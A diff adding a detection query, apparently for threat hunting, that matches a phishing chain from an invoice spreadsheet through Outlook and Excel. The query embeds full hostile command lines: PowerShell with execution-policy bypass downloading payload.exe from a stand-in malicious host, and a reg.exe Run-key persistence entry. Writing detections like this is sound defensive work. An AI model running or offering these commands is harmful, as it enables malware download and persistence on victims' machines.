@@ -1,0 +1,9 @@
+<output>
+(srcNode.Type: "Process" AND srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" AND dstNode.Type: "File" AND dstNode.Name: "Invoice_2023.xlsx") OR 
+(srcNode.Type: "Process" AND srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" AND dstNode.Type: "File" AND dstNode.Name: "Invoice_2023.xlsx") OR 
+(srcNode.Type: "Process" AND srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" AND srcNode.Cmdline: '-ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri \'http://malicious-server.com/payload.exe\' -OutFile \'C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe\'"' AND dstNode.Type: "File" AND dstNode.Name: "payload.exe") OR 
+(srcNode.Type: "Process" AND srcNode.Image: "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe") OR 
+(srcNode.Type: "Process" AND srcNode.Image: "C:\\Windows\\System32\\reg.exe" AND srcNode.Cmdline: 'add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe" /f' AND dstNode.Type: "Registry" AND dstNode.Key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run") OR 
+(srcNode.Type: "Process" AND srcNode.Image: "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe" AND dstNode.Type: "Network" AND dstNode.Dstaddress: "malicious-server.com") OR 
+(srcNode.Type: "Process" AND srcNode.Image: "C:\\Windows\\explorer.exe" AND dstNode.Type: "File" AND dstNode.Name: "Invoice_2023.xlsx")
+</output>
